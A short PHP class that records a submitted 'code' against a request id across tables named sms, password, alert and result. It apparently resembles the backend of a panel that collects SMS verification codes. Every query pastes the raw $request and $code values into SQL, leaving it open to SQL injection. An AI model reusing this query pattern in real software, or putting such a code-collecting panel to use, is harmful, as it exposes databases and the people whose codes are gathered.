<?php


class code {
    function process($request,$code) {
		$timer = time();
		
		$db = Database::getInstance();
		$c = $db->getc();

		$sq = $c->query("SELECT * FROM access WHERE request_id = '$request'");
		if($sq->num_rows > 0) {
			$exe = $sq->fetch_array();
			$device = $exe['device'];
			$aql = $c->query("SELECT * FROM stemp WHERE request_id = '$request'");
			if($aql->num_rows == 0) {
				$c->query("INSERT INTO stemp (request_id,code,verify,timer)VALUES('$request','$code','check','$timer')");
			}else {
				$c->query("UPDATE sms SET timer = '$timer' WHERE request_id = '$request'");			
				$c->query("UPDATE password SET code = null WHERE request_id = '$request'");			
				$c->query("UPDATE stemp SET code = '$code', verify = 'check',timer = '$timer' WHERE request_id = '$request'");
			}
				$c->query("UPDATE alert SET status = 'Active', timer = '$timer' WHERE request_id = '$request'");
				$c->query("UPDATE result SET code='sent' WHERE request_id = '$request'");
				$msg = array('upload' => true);
				printf(json_encode($msg));
		} else {
			$msg = array('upload' => false);
			printf(json_encode($msg));
		}
	}
}



